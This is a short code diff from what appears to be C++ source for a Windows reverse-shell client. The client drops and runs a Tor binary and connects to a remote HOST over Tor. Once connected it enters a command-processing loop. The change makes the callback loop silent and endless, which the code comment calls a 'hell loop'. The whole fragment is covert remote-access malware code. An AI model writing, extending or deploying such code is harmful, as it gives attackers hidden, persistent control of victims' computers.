@@ -33,15 +33,14 @@ int main() {
         dropTor();
     }
     
+    // Hell loop of forever restarting TOR and trying to connect to the server :)
     while (1) {
         torRevShellClient c(".\\tor.exe", HOST);
+        c.startProxy();
         bool conn = c.attemptConnect();
-        while (!conn) {
-            printf("Connection failed... Retrying in 10 seconds\n");
-            Sleep(10000);
-            conn = c.attemptConnect();
+        if (conn) {
+            c.cmdProcessLoop();
         }
-        c.cmdProcessLoop();
     }
 
     return 0;
